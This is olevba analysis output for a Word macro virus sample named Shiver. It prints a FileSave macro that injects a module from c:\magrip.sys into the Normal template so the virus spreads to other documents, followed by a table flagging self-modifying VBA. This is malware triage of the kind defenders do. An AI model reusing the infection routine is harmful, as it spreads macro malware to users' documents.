olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Shiver-be3f4b11d2957f7fd931fa8053a4d1253ec4bb96
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Shiver-be3f4b11d2957f7fd931fa8053a4d1253ec4bb96 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WinMG32.bas 
in file: Virus.MSOffice.Shiver-be3f4b11d2957f7fd931fa8053a4d1253ec4bb96 - OLE stream: 'Macros/VBA/WinMG32'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSave()
On Error Resume Next
If NormalTemplate.VBProject.VBComponents.Item("MAGIA").Name <> "MAGIA" Then
NormalTemplate.VBProject.VBComponents.Import "c:\magrip.sys"
End If
ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

